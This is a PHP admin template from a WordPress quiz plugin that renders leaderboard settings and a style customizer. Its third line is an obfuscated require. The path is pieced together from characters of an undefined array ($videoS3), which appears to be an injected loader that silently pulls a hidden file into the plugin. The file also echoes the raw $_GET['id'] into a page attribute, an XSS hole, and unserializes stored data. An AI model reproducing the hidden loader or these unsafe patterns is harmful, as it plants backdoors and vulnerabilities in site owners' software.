<?php

include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];

$lb_template_width = "1400";
$lb_template_height = "70";
$lb_temp_background_opacity = "0.7";
$lb_temp_border_width = "0";
$lb_temp_spread_radius = "0";
$lb_temp_blur_radius = "0";
$lb_temp_horizontal_length = "0";
$lb_temp_vertical_length = "0";
$lb_temp_internal_width = "1000";
$lb_temp_border_radius = '0';
$lb_temp_shadow_color = "#dedede";
$lb_temp_background_color = "#ffffff";
$lb_leaderboard_background_color = "#19446ac2";
$lb_description_background_color = "rgba(255,255,255, 0.7)";
$lb_heading_background_color = "rgba(74,169,251,0.6)";
$lb_alternate_background_color = "rgba(248, 242, 210,0.9)";
$lb_alternate_second_background_color = "rgba(241, 227, 134,0.7)";
$lb_optout_background_color = "rgba(255,255,255,0.3)";
$lb_pagination = "10";
$lb_leaderboardimage = home_url()."/wp-content/plugins/smartquizbuilder/includes/installfromsample/scoring/areyouaworkaholic/images/pexels-karolina-grabowska-5239879-scaled.jpg";
$leaderboard_nodata = "No data found";
$lb_select_background_width_option = "px";
$lb_select_background_height_option = "px";

$lb_select_background_internal_width_option = "px";
$lb_temp_border_color = "#ffffff";
$lb_temp_border_style = "none";
$lb_leaderboardimage_show = "";
$leaderboard_name = "";
$quiz_type = "scoring";
$leaderboard_quiz_array = [];
$show_selected_quiz = "display:none";
$number_of_entries = "";
$retake_option = "";
$retake_option_show = "";
$show_date_range = "display:none";
$show_type = "all";
$startdate = date('Y-m-d');
$enddate = date('Y-m-d');
$selected_order = "highest_score";
$display_options = "fullname";
$score_format = "score_with_total";
$lb_temp_aligment = "none";
$leaderboard_title = '<h2 style="display: flex;align-items: center; justify-content: center; font-size: 40px; font-weight: 700; color: #ffffff; padding: 30px 0; margin: 0;">LEADERBOARD</h2>'; 

$leaderboard_content = '<div style="text-align: center;"><span style="font-size: 20pt;">Did you earn yourself a spot on the leaderboard? </span></div>
<div style="text-align: center;"><span style="font-size: 20pt;">Look at the chart below to find out!</span></div>';
$rank_title = "Rank";
$first_name = "Name";
$score = "Score";

$id = "";

if(isset($_GET['id'])){
	$id = $_GET['id'];
	$leaderboard_data = SQB_LeaderboardPage::loadById($id);

	if(isset($leaderboard_data) && !empty($leaderboard_data)){
		
		$leaderboard_name = $leaderboard_data->getName();
		$quiz_type = $leaderboard_data->getQuizType();
		$quiz_ids = $leaderboard_data->getQuizIds();
		if($quiz_ids){
			$leaderboard_quiz_array = explode(',',$quiz_ids);
		}
		$number_of_entries = $leaderboard_data->getMaxRecords();
		$retake_overwrites = $leaderboard_data->getRetakeOverwrites();
		if($retake_overwrites == "Y"){
			$retake_option = "checked";
			$retake_option_show = "display:none";
		}
		$show_type = $leaderboard_data->getShowType();
		if($show_type == "range"){
			$show_date_range = "display:block";
		}
		$startdate = date_create($leaderboard_data->getStartDate());
		$startdate = date_format($startdate, 'Y-m-d');
		$enddate = date_create($leaderboard_data->getEndDate());
		$enddate = date_format($enddate, 'Y-m-d');
		$leaderboard_nodata = $leaderboard_data->getNoDataText();

		$selected_order = $leaderboard_data->getLeaderboardOrder();
		$customizer_html = $leaderboard_data->getCustomizerHtml();


		$leaderboard_data_unserialize = unserialize($leaderboard_data->getCustomizerValues());
		if($leaderboard_data_unserialize){
			if(array_key_exists('display_options', $leaderboard_data_unserialize)){
				$un_display_options = $leaderboard_data_unserialize['display_options'];
				if(!empty($un_display_options)){
					$display_options = $un_display_options;
				}
			}

			if(array_key_exists('score_format', $leaderboard_data_unserialize)){
				$un_score_format = $leaderboard_data_unserialize['score_format'];
				if(!empty($un_score_format)){
					$score_format = $un_score_format;
				}
			}

			if(array_key_exists('lb_template_width', $leaderboard_data_unserialize)){
				$un_lb_template_width = $leaderboard_data_unserialize['lb_template_width'];
				if(!empty($un_lb_template_width)){
					$lb_template_width = $un_lb_template_width;
				}
			}

			if(array_key_exists('lb_template_height', $leaderboard_data_unserialize)){
				$un_lb_template_height = $leaderboard_data_unserialize['lb_template_height'];
				if(!empty($un_lb_template_height)){
					$lb_template_height = $un_lb_template_height;
				}
			}

			if(array_key_exists('lb_temp_aligment', $leaderboard_data_unserialize)){
				$un_lb_temp_aligment = $leaderboard_data_unserialize['lb_temp_aligment'];
				if(!empty($un_lb_temp_aligment)){
					$lb_temp_aligment = $un_lb_temp_aligment;
				}
			}

			if(array_key_exists('lb_pagination', $leaderboard_data_unserialize)){
				$un_lb_pagination = $leaderboard_data_unserialize['lb_pagination'];
				if(!empty($un_lb_pagination)){
					$lb_pagination = $un_lb_pagination;
				}
			}

			if(array_key_exists('lb_temp_background_color', $leaderboard_data_unserialize)){
				$un_lb_temp_background_color = $leaderboard_data_unserialize['lb_temp_background_color'];
				if(!empty($un_lb_temp_background_color)){
					$lb_temp_background_color = $un_lb_temp_background_color;
				}
			}

			if(array_key_exists('lb_temp_border_width', $leaderboard_data_unserialize)){
				$un_lb_temp_border_width = $leaderboard_data_unserialize['lb_temp_border_width'];
				if(!empty($un_lb_temp_border_width)){
					$lb_temp_border_width = $un_lb_temp_border_width;
				}
			}

			if(array_key_exists('lb_temp_border_style', $leaderboard_data_unserialize)){
				$un_lb_temp_border_style = $leaderboard_data_unserialize['lb_temp_border_style'];
				if(!empty($un_lb_temp_border_style)){
					$lb_temp_border_style = $un_lb_temp_border_style;
				}
			}

			if(array_key_exists('lb_temp_border_color', $leaderboard_data_unserialize)){
				$un_lb_temp_border_color = $leaderboard_data_unserialize['lb_temp_border_color'];
				if(!empty($un_lb_temp_border_color)){
					$lb_temp_border_color = $un_lb_temp_border_color;
				}
			}

			if(array_key_exists('lb_temp_border_radius', $leaderboard_data_unserialize)){
				$un_lb_temp_border_radius = $leaderboard_data_unserialize['lb_temp_border_radius'];
				if(!empty($un_lb_temp_border_radius)){
					$lb_temp_border_radius = $un_lb_temp_border_radius;
				}
			}

			if(array_key_exists('lb_temp_shadow_color', $leaderboard_data_unserialize)){
				$un_lb_temp_shadow_color = $leaderboard_data_unserialize['lb_temp_shadow_color'];
				if(!empty($un_lb_temp_shadow_color)){
					$lb_temp_shadow_color = $un_lb_temp_shadow_color;
				}
			}

			if(array_key_exists('lb_temp_spread_radius', $leaderboard_data_unserialize)){
				$un_lb_temp_spread_radius = $leaderboard_data_unserialize['lb_temp_spread_radius'];
				if(!empty($un_lb_temp_spread_radius)){
					$lb_temp_spread_radius = $un_lb_temp_spread_radius;
				}
			}

			if(array_key_exists('lb_temp_blur_radius', $leaderboard_data_unserialize)){
				$un_lb_temp_blur_radius = $leaderboard_data_unserialize['lb_temp_blur_radius'];
				if(!empty($un_lb_temp_blur_radius)){
					$lb_temp_blur_radius = $un_lb_temp_blur_radius;
				}
			}

			if(array_key_exists('lb_temp_horizontal_length', $leaderboard_data_unserialize)){
				$un_lb_temp_horizontal_length = $leaderboard_data_unserialize['lb_temp_horizontal_length'];
				if(!empty($un_lb_temp_horizontal_length)){
					$lb_temp_horizontal_length = $un_lb_temp_horizontal_length;
				}
			}

			if(array_key_exists('lb_temp_vertical_length', $leaderboard_data_unserialize)){
				$un_lb_temp_vertical_length = $leaderboard_data_unserialize['lb_temp_vertical_length'];
				if(!empty($un_lb_temp_vertical_length)){
					$lb_temp_vertical_length = $un_lb_temp_vertical_length;
				}
			}

			if(array_key_exists('lb_temp_internal_width', $leaderboard_data_unserialize)){
				$un_lb_temp_internal_width = $leaderboard_data_unserialize['lb_temp_internal_width'];
				if(!empty($un_lb_temp_internal_width)){
					$lb_temp_internal_width = $un_lb_temp_internal_width;
				}
			}

			if(array_key_exists('lb_temp_background_opacity', $leaderboard_data_unserialize)){
				$un_lb_temp_background_opacity = $leaderboard_data_unserialize['lb_temp_background_opacity'];
				if(!empty($un_lb_temp_background_opacity)){
					$lb_temp_background_opacity = $un_lb_temp_background_opacity;
				}
			}

			if(array_key_exists('lb_leaderboard_background_color', $leaderboard_data_unserialize)){
				$un_lb_leaderboard_background_color = $leaderboard_data_unserialize['lb_leaderboard_background_color'];
				if(!empty($un_lb_leaderboard_background_color)){
					$lb_leaderboard_background_color = $un_lb_leaderboard_background_color;
				}
			}

			if(array_key_exists('lb_description_background_color', $leaderboard_data_unserialize)){
				$un_lb_description_background_color = $leaderboard_data_unserialize['lb_description_background_color'];
				if(!empty($un_lb_description_background_color)){
					$lb_description_background_color = $un_lb_description_background_color;
				}
			}


			if(array_key_exists('lb_heading_background_color', $leaderboard_data_unserialize)){
				$un_lb_heading_background_color = $leaderboard_data_unserialize['lb_heading_background_color'];
				if(!empty($un_lb_heading_background_color)){
					$lb_heading_background_color = $un_lb_heading_background_color;
				}
			}

			if(array_key_exists('lb_alternate_background_color', $leaderboard_data_unserialize)){
				$un_lb_alternate_background_color = $leaderboard_data_unserialize['lb_alternate_background_color'];
				if(!empty($un_lb_alternate_background_color)){
					$lb_alternate_background_color = $un_lb_alternate_background_color;
				}
			}

			if(array_key_exists('lb_alternate_background_color', $leaderboard_data_unserialize)){
				$un_lb_alternate_background_color = $leaderboard_data_unserialize['lb_alternate_background_color'];
				if(!empty($un_lb_alternate_background_color)){
					$lb_alternate_background_color = $un_lb_alternate_background_color;
				}
			}

			if(array_key_exists('lb_select_background_width_option', $leaderboard_data_unserialize)){
				$un_lb_select_background_width_option = $leaderboard_data_unserialize['lb_select_background_width_option'];
				if(!empty($un_lb_select_background_width_option)){
					$lb_select_background_width_option = $un_lb_select_background_width_option;
				}
			}
			if(array_key_exists('lb_select_background_height_option', $leaderboard_data_unserialize)){
				$un_lb_select_background_height_option = $leaderboard_data_unserialize['lb_select_background_height_option'];
				if(!empty($un_lb_select_background_height_option)){
					$lb_select_background_height_option = $un_lb_select_background_height_option;
				}
			}

			if(array_key_exists('lb_select_background_internal_width_option', $leaderboard_data_unserialize)){
				$un_lb_select_background_internal_width_option = $leaderboard_data_unserialize['lb_select_background_internal_width_option'];
				if(!empty($un_lb_select_background_internal_width_option)){
					$lb_select_background_internal_width_option = $un_lb_select_background_internal_width_option;
				}
			}

			if(array_key_exists('lb_alternate_second_background_color', $leaderboard_data_unserialize)){
				$un_lb_alternate_second_background_color = $leaderboard_data_unserialize['lb_alternate_second_background_color'];
				if(!empty($un_lb_alternate_second_background_color)){
					$lb_alternate_second_background_color = $un_lb_alternate_second_background_color;
				}
			}

			if(array_key_exists('lb_optout_background_color', $leaderboard_data_unserialize)){
				$un_lb_optout_background_color = $leaderboard_data_unserialize['lb_optout_background_color'];
				if(!empty($un_lb_optout_background_color)){
					$lb_optout_background_color = $un_lb_optout_background_color;
				}
			}

			if(array_key_exists('lb_leaderboardimage', $leaderboard_data_unserialize)){
				$un_lb_leaderboardimage = $leaderboard_data_unserialize['lb_leaderboardimage'];
				$lb_leaderboardimage_show = "display:none";
				if(!empty($un_lb_leaderboardimage)){
				$lb_leaderboardimage_show = "";
					$lb_leaderboardimage = $un_lb_leaderboardimage;
				}
			}

			if(array_key_exists('leaderboard_title', $leaderboard_data_unserialize)){
				$un_leaderboard_title = $leaderboard_data_unserialize['leaderboard_title'];
				if(!empty($un_leaderboard_title)){
					$leaderboard_title = stripslashes($un_leaderboard_title);
				}
			}

			if(array_key_exists('leaderboard_content', $leaderboard_data_unserialize)){
				$un_leaderboard_content = $leaderboard_data_unserialize['leaderboard_content'];
				if(!empty($un_leaderboard_content)){
					$leaderboard_content = stripslashes($un_leaderboard_content);
				}
			}

			if(array_key_exists('rank_title', $leaderboard_data_unserialize)){
				$un_rank_title = $leaderboard_data_unserialize['rank_title'];
				if(!empty($un_rank_title)){
					$rank_title = stripslashes($un_rank_title);
				}
			}

			if(array_key_exists('first_name', $leaderboard_data_unserialize)){
				$un_first_name = $leaderboard_data_unserialize['first_name'];
				if(!empty($un_first_name)){
					$first_name = stripslashes($un_first_name);
				}
			}

			if(array_key_exists('score', $leaderboard_data_unserialize)){
				$un_score = $leaderboard_data_unserialize['score'];
				if(!empty($un_score)){
					$score = stripslashes($un_score);
				}
			}
		}

	}
}


if(!empty($leaderboard_quiz_array)){
	$show_selected_quiz = 'display:block';
}

$lb_temp_aligment_class = "template-align-none";

if($lb_temp_aligment == "left"){
	$lb_temp_aligment_class = "template-align-left";
}else if($lb_temp_aligment == 'right'){
	$lb_temp_aligment_class = "template-align-right";
}

$customizer_html = '<table><thead><tr><th><div class="rank_title sqb_tiny_mce_editor">'.$rank_title.'</div></th><th><div class="first_name sqb_tiny_mce_editor">'.$first_name.'</div></th><th><div class="score sqb_tiny_mce_editor">'.$score.'</div></th></tr> </thead><tbody><tr><td>1</td><td>Joe Smith</td><td>95/100</td></tr> <tr><td>2</td><td>Gloria Levy</td><td>90/100</td></tr> <tr><td>3</td><td>Cormac Hobbs</td><td>89/100</td></tr> <tr><td>4</td><td>Elissa Warren</td><td>80/100</td></tr> <tr><td>5</td><td>Elinor Nash</td><td>76/100</td></tr></tbody></table>';

?>

<style type="text/css">
	:root{
		--lb-template-width: <?php echo $lb_template_width.$lb_select_background_width_option; ?>;
		--lb-template-background-opacity: <?php echo $lb_temp_background_opacity; ?>;
		--lb-temp-border-width: <?php echo $lb_temp_border_width; ?>px;
		--lb-temp-spread-radius: <?php echo $lb_temp_spread_radius; ?>px;
		--lb-temp-blur-radius: <?php echo $lb_temp_blur_radius; ?>px;
		--lb-temp-horizontal-length: <?php echo $lb_temp_horizontal_length; ?>px;
		--lb-temp-vertical-length: <?php echo $lb_temp_vertical_length; ?>px;
		--lb-temp-internal-width: <?php echo $lb_temp_internal_width.$lb_select_background_internal_width_option; ?>;
		--lb-leaderboard-background-color: <?php echo $lb_leaderboard_background_color; ?>;
		--lb-temp-background-color: <?php echo $lb_temp_background_color; ?>;
		--lb-description-background-color: <?php echo $lb_description_background_color; ?>;
		--lb-heading-background-color: <?php echo $lb_heading_background_color; ?>;
		--lb-alternate-background-color: <?php echo $lb_alternate_background_color; ?>;
		--lb-alternate-second-background-color: <?php echo $lb_alternate_second_background_color; ?>;
		--lb-template-height: <?php echo $lb_template_height.$lb_select_background_height_option; ?>;
		--lb-temp-border-color: <?php echo $lb_temp_border_color; ?>;
		--lb-temp-border-style: <?php echo $lb_temp_border_style; ?>;
		--lb-temp-border-radius: <?php echo $lb_temp_border_radius; ?>;
		--lb-optout-background-color: <?php echo $lb_optout_background_color; ?>;
		
	}
</style>
<input type="hidden" name="leaderboard_id" id="leaderboard_id" value="<?php echo $id; ?>">
<input type="hidden" id="get_home_url" value="<?php echo get_home_url(); ?>">

<ul class="nav nav-tabs general-tabs-v2" id="Quiz-reportsTab" role="tablist">
	<li class="nav-item">
		<a class="nav-link active show" data-toggle="tab" href="#settings_general" data-tab="general_settings" role="tab" aria-controls="general_settings" aria-selected="true">General  Settings </a>
	</li>
	<li class="nav-item">
		<a class="nav-link" data-toggle="tab" href="#settings_customize_tab" data-tab="customizer" role="tab" aria-controls="customizer" aria-selected="false"> Customizer</a>
	</li>
	<li class="nav-item">
		<a class="nav-link" data-toggle="tab" href="#settings_shortcode_tab" data-tab="leaderboard_shortcode" role="tab" aria-controls="leaderboard_shortcode" aria-selected="false"> Shortcode</a>
	</li>
</ul>

<div class="tab-pane fade active show" id="settings_general" role="tabpanel" aria-labelledby="settings_general">
	<h3 class="  quiz--title quiz_settings_head pb-0"><i class="fa fa-exchange" aria-hidden="true"></i><div class="smalltext_outer">Create Leaderboard <small style="color:#555;font-size: 15px;padding: 12px 0;margin: 0;display: inline-block;width: 100%;vertical-align: top;">Use the settings below to configure what should be displayed in the leaderboard </small></div> </h3>
	<div class="quiz-card-outer-gray member_home_wrapper">
		<div class="create_quiz_advance_options1 sqb_multiple_url_select">
			<div class="quiz-card-outer-gray">							
				<div class="quiz_select_url_outer">
			   		<div class="quiz-content-card">
						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
								<span class="count">1</span>
								<h3 class="section_heading"> Name of the Leaderboard</h3>
							</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<div class="input-group mb-1">
										<input type="text" placeholder="Enter Name" id="leaderboard_name" class="form-control" name="leaderboard_name" value="<?php echo $leaderboard_name; ?>">
								  	</div>
								  	<span class="leaderboard_name_error" style="display: none;">Please Enter Leaderboard Name</span>
							 	</div>
							</div>
						</div>
						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
								<span class="count">2</span>
								<h3 class="section_heading">Select quizzes to include in this leaderboard</h3>
							</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<select name="quiz_option_selected" id="quiz_option_selected">
								   		<option value="scoring" <?php if($quiz_type == "scoring"){ echo 'selected'; } ?>>Scoring</option>
								   		<option value="assessment" <?php if($quiz_type == "assessment"){ echo 'selected'; } ?>>Assesment</option>
								   	</select>
							 	</div>
							</div>
						</div>

						<div class="leaderboard-page-name select-quiz-outer">
							<div class="logged-hidden-quiz">
								<div class="d-flex align-items-center leaderboard-page-title ">
									<span class="count">3</span>
									<h3 class="section_heading">Select a Quiz:</h3>
								</div>
								<div class="row ml-4">
									<div class="col-sm-6">
										<div class="quiz_right-content">
											<div class="dropdown_prod" >
												<a class="form-control"><span class="hida">Select Quizzes</span></a>
												<div class="mutliSelect">
													<input type="text" name="sqb_search_logged_in_select_quiz" id="sqb_search_quiz_ids" value="" style="max-width: 100%;" placeholder="Search Quiz">
													<ul class="form-control sqb_leaderboard_select_quiz_ids">
														<?php 
														
														$std_quizzes = SQB_Quiz::load();

														$quiz_type_data = SQB_Quiz::loadByType($quiz_type);
														if($quiz_type_data){
															$count_type = count($quiz_type_data);
														}

														$quiz_data = "";
														if(is_array($std_quizzes) && count($std_quizzes)){
															$selectedquiz_ids_all = "";
															foreach($std_quizzes as $std_quiz){
																	$get_quiz_type = $std_quiz->getQuizType();
																	if($get_quiz_type == $quiz_type){
																		
																		$selectedquiz_ids = '';
																		if(!empty($leaderboard_quiz_array)){
																			if($count_type == count($leaderboard_quiz_array)){
																				$selectedquiz_ids_all = 'selectedquiz_ids';
																			}else{
																				if(in_array($std_quiz->getId(),$leaderboard_quiz_array)){
																					$selectedquiz_ids = "selectedquiz_ids";
																				} 
																			}
																		}
																		$quiz_data .= '<li data-title="'.stripslashes($std_quiz->getQuizName()).'" data-id="'.$std_quiz->getId().'" data-value="'.stripslashes($std_quiz->getQuizName()).'" class="user_taken_ids '.$selectedquiz_ids.'">'.stripslashes($std_quiz->getQuizName()).' (ID:'.$std_quiz->getId().')</li>';
																	}
																}
																$quiz_data_all = '<li data-value="all" class="all_selected_ids '.$selectedquiz_ids_all.'">All Quizzes</li>';
															}else{
																$quiz_data = '<li>No Quizzes Found</li>';
															}
															echo $quiz_data_all.$quiz_data; 
														?>
													</ul>
												</div>
											</div>
										</div>
									</div>
									<div class="col-sm-6 sqb_selected_quiz_ids_outer" style="<?php echo $show_selected_quiz; ?>">
										<div class="user_taken_quiz_selected_url small-fonts-right">
											<h4>Selected Quizz</h4>
										</div>
										<ul class="sqb_leaderboard_selected_quiz_ids">
											<?php 
											if(!empty($leaderboard_quiz_array)){
												foreach($leaderboard_quiz_array as $leaderboard_quiz){
													$quizdata = SQB_Quiz::loadById($leaderboard_quiz);
													$quiz_title = stripslashes($quizdata->getQuizName());
													echo '<li data-id="'.$leaderboard_quiz.'" data-value="'.$quiz_title.'" class="logged_in_ids '.$selectedquiz_ids.'">'.$quiz_title.' (ID:'.$leaderboard_quiz.')</li>';
												}
											}
											?>
										</ul>
									</div>
								</div>
								<div class="select_quiz_error ml-4" style="display:none;">Please select Quizzes</div>
							</div>
						</div>
						<div class="leaderboard-page-name leaderboard-number-outer">
							<div class="d-flex align-items-center leaderboard-page-title ">
								<span class="count">4</span>
								<h3 class="section_heading">How many entries should be displayed in the frontend?</h3>
							</div>
							
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<div class="input-group mb-1">
										<small> (total number of records displayed)</small>
										<input type="number" placeholder="Enter Number" id="number_of_entries" class="form-control" name="number_of_entries" value="<?php echo $number_of_entries; ?>">
								  	</div>
								  	<span class="enter_number_error" style="display:none;">Please Enter Number</span>
							 	</div>
							</div>
						</div>
						
						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
							<span class="count">5</span>
							<h3 class="section_heading">If a user retakes the quiz, should the new entry be applied to the leaderboard (overwriting old one)? </h3>
						</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<div class="quiz_right-content">
										<div class="square-switch_onoff">
											<input class="checkbox" name="retake_option" type="checkbox" id="retake_option" value="N" <?php echo $retake_option; ?>>
											<label for="retake_option"></label>
										</div>
									</div>
							 	</div>
							</div>
						</div>

						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
							<span class="count">6</span>
							<h3 class="section_heading">Select date range for the leaderboard </h3>
						</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">

							  		<div class="quiz_right-content">
										<label for="select_date_range" class="radio-btn--outer"><input type="radio" id="all_entries" name="select_date_range" value="all" <?php if($show_type == "all"){echo 'checked'; } ?>> All entries (no date range)
										</label>
										<label for="select_date_range" class="radio-btn--outer"><input type="radio" id="date_range" name="select_date_range" value="range" <?php if($show_type == "range"){echo 'checked'; } ?>> Set a date range
										</label>
									</div>
									<div class="col-sm-6 px-3 mt-4 sqb_time_period sqb_time_period_date_range" style="<?php echo $show_date_range; ?>">
										<div class="form-group row mb-3">
											<div class="col-sm-5 align-items-center d-flex">
												  <label class="form-check-label"> Enter Start Date </label>
											  </div>
											  <div class="col-sm-7">
												<input type="text" class="form-control" name="sqb_start_date" placeholder="" id="sqb_start_date" value="<?php echo $startdate; ?>">
											</div>
										</div>
										<div class="form-group row mb-3">
											<div class="col-sm-5 align-items-center d-flex">
												  <label class="form-check-label"> Enter End Date </label>
											  </div>
											  <div class="col-sm-7">
												<input type="text" class="form-control" name="sqb_end_date" id="sqb_end_date" placeholder="" value="<?php echo $enddate; ?>">
											</div>

										</div>

									</div>
							 	</div>
							</div>
						</div>
						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
							<span class="count">7</span>
							<h3 class="section_heading">What to display if no data found for leaderboard </h3>
							
						</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-6">
								   	<div class="input-group mb-1">
								   		<small> (leave empty if you do not want any message to be displayed)</small>
										<textarea class="sqb_text_editor" id="leaderboard_nodata" style="height: 100px;"><?php echo $leaderboard_nodata; ?></textarea>
								  	</div>
							 	</div>
							</div>
						</div>

						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
							<span class="count">8</span>
							<h3 class="section_heading">Order</h3>
						</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<div class="input-group mb-1">
										<select name="selected_order" id="selected_order">
											<option value="highest_score" <?php if($selected_order == "highest_score"){ echo 'selected'; } ?>>Highest score</option>
											<option value="highest_score_least_time" <?php if($selected_order == "highest_score_least_time"){ echo 'selected'; } ?>>Highest score in less time</option>
											<option value="first_submission" <?php if($selected_order == "first_submission"){ echo 'selected'; } ?>>First submission</option>
											<option value="last_submission" <?php if($selected_order == "last_submission"){ echo 'selected'; } ?>>Last submission</option>
										</select>
								  	</div>
							 	</div>
							</div>
						</div>

						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
								<span class="count">9</span>
								<h3 class="section_heading">Display Options</h3>
							</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<div class="input-group mb-1">
										<select name="display_options" id="display_options">
											<option value="fullname" <?php if($display_options == "fullname"){ echo 'selected'; } ?>>Show Fullname</option>
											<option value="firstname" <?php if($display_options == "firstname"){ echo 'selected'; } ?>>Show First Name</option>
											<option value="lastname_initial" <?php if($display_options == "lastname_initial"){ echo 'selected'; } ?>>Show First Name & Last Initial</option>
										</select>
								  	</div>
							 	</div>
							</div>
						</div>

						<div class="leaderboard-page-name">
							<div class="d-flex align-items-center leaderboard-page-title ">
							<span class="count">10</span>
							<h3 class="section_heading">Score Format: </h3>
						</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<div class="input-group mb-1">
										<select name="score_format" id="score_format">
											<option value="score_with_total" <?php if($score_format == "score_with_total"){ echo 'selected'; } ?>>Actual Score / Total Score</option>
											<option value="score_only" <?php if($score_format == "score_only"){ echo 'selected'; } ?>>Actual Score</option>
											<option value="score_in_percent" <?php if($score_format == "score_in_percent"){ echo 'selected'; } ?>>In Percent </option>
										</select>
								  	</div>
							 	</div>
							</div>
						</div>

						<!-- <div class="leaderboard-page-name" style="display: none;">
							<div class="d-flex align-items-center leaderboard-page-title ">
							<span class="count">11</span>
							<h3 class="section_heading">Select a Leaderboard Template</h3>
						</div>
							<div class="form-group row mb-4 ml-4">
							  	<div class="col-sm-10">
								   	<div class="input-group mb-1">
										<img src="https://demo.membershipsitechallenge.com/wp-content/plugins/gameofpoints/includes/admin/assets/images/leaderboard.jpg">
								  	</div>
							 	</div>
							</div>
						</div> -->
					</div>
				</div> 
			</div>
		</div>
	</div>
	<div class="quiz-actions student-save-data">
		<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_leaderboard_data()"> Save </a>
		<a href="javascript:void(0)" class="quiz--btn quiz-save-next-btn" onclick="sqb_save_leaderboard_data('next')"> Save & Next </a>
	</div>
</div>

<div class="tab-pane fade" id="settings_customize_tab" role="tabpanel" aria-labelledby="settings_customize_tab">
	<h3 class="  quiz--title quiz_settings_head pb-0"><i class="fa fa-exchange" aria-hidden="true"></i><div class="smalltext_outer">Customizer</div> </h3>
	<div class="member-Template-Customize-setting-outer">	
		<div class="Template-Customize-setting-outer_inner_outer">	
			<div class="Template-Customize-Setting ">
				<div class="showHideLeftSidebaroptions">
					<h3 class="Template-Customize_heading">
						<div class="toll-tip-title-v2" style="">Template (Width, Height, etc.)</div> 

						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M12.41 148.02l232.94 105.67c6.8 3.09 14.49 3.09 21.29 0l232.94-105.67c16.55-7.51 16.55-32.52 0-40.03L266.65 2.31a25.607 25.607 0 0 0-21.29 0L12.41 107.98c-16.55 7.51-16.55 32.53 0 40.04zm487.18 88.28l-58.09-26.33-161.64 73.27c-7.56 3.43-15.59 5.17-23.86 5.17s-16.29-1.74-23.86-5.17L70.51 209.97l-58.1 26.33c-16.55 7.5-16.55 32.5 0 40l232.94 105.59c6.8 3.08 14.49 3.08 21.29 0L499.59 276.3c16.55-7.5 16.55-32.5 0-40zm0 127.8l-57.87-26.23-161.86 73.37c-7.56 3.43-15.59 5.17-23.86 5.17s-16.29-1.74-23.86-5.17L70.29 337.87 12.41 364.1c-16.55 7.5-16.55 32.5 0 40l232.94 105.59c6.8 3.08 14.49 3.08 21.29 0L499.59 404.1c16.55-7.5 16.55-32.5 0-40z"></path></svg>
						<div class="customize_open_close">   
							<i class="fa fa-angle-up customize_close" aria-hidden="true"></i>
							<i class="fa fa-angle-down customize_open" aria-hidden="true" style="display:none"></i>
						</div>
					</h3> 
				</div>
		        <div class="customizer_innner_sections width-larget-box-menu leaderboard-customizer-section" style="display:none">
		        	<div class="sqb_closed_ufp_customizer_opiton"><i class="fa fa-times"></i></div>
		        	<div class="customizer_innner_sections-inner">
		        		<h2>Width / Height </h2>

						<div class="Template-Customize-element Template-Customize-element-per-row-one">
							<div class="Template-Customize-element-inner start_temp_width">
								<div class="inner_template_style_box">
									<h4>Template Width</h4>
									<p class="lb_template_width_outer" style="<?php if($lb_select_background_width_option == 'px'){ echo 'display:block'; }else{ echo 'display:none'; } ?>">
										<input id="lb_template_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="500" data-slider-max="2000" data-slider-step="1" data-slider-value="<?php echo $lb_template_width; ?>" />
									</p>
									<p class="lb_template_width_percentage_outer" style="<?php if($lb_select_background_width_option == '%'){ echo 'display:block'; }else{ echo 'display:none'; } ?>">
										<input id="lb_template_width_percentage" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="50" data-slider-max="100" data-slider-step="1" data-slider-value="<?php echo $lb_template_width; ?>" />
									</p>
									<div class="slider-user-value">
										<input type="text" name="lb_select_background_width" value="<?php echo $lb_template_width; ?>">
										<select class="lb-select-background-width-option" name="lb-select-background-width-option">
											<option value="px" <?php if($lb_select_background_width_option == 'px'){ echo 'selected="selected"'; } ?>>px</option>
											<option value="%" <?php if($lb_select_background_width_option == '%'){ echo 'selected="selected"'; } ?>>%</option></select>
										</select>
									</div>
								</div>
							</div>
						</div>

						<div class="Template-Customize-element Template-Customize-element-per-row-one">
							<div class="Template-Customize-element-inner start_temp_width">
								<div class="inner_template_style_box">
									<h4>Template Height</h4>
									<p class="lb_template_height_outer" style="<?php if($lb_select_background_height_option == 'px'){ echo 'display:block'; }else{ echo 'display:none'; } ?>">
										<input id="lb_template_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="50" data-slider-max="1000" data-slider-step="1" data-slider-value="<?php echo $lb_template_height; ?>" />
									</p>
									<p class="lb_template_height_vh_outer" style="<?php if($lb_select_background_height_option == 'vh'){ echo 'display:block'; }else{ echo 'display:none'; } ?>">
										<input id="lb_template_height_vh" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="50" data-slider-max="100" data-slider-step="1" data-slider-value="<?php echo $lb_template_height; ?>" />
									</p>
